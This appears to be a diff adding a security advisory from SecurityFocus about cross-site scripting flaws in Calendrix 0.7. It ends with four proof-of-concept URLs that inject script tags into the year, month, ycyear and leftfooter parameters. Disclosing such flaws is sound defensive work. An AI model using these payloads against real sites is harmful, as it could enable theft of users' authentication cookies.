@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/24626/info
+
+Calendrix is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Calendrix 0.7 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/[PRODUCT-DIRECTORY]/calendar.php?year=<script>alert(document.cookies)</script> http://www.example.com/[PRODUCT-DIRECTORY]/calendar.php?month="><script>alert(document.cookies)</script> http://www.example.com/[PRODUCT-DIRECTORY]/yearcal.php?ycyear=<script>alert(document.cookies)</script> http://www.example.com/[PRODUCT-DIRECTORY]/cal_footer.inc.php?leftfooter=<script>alert(document.cookies)</script> 
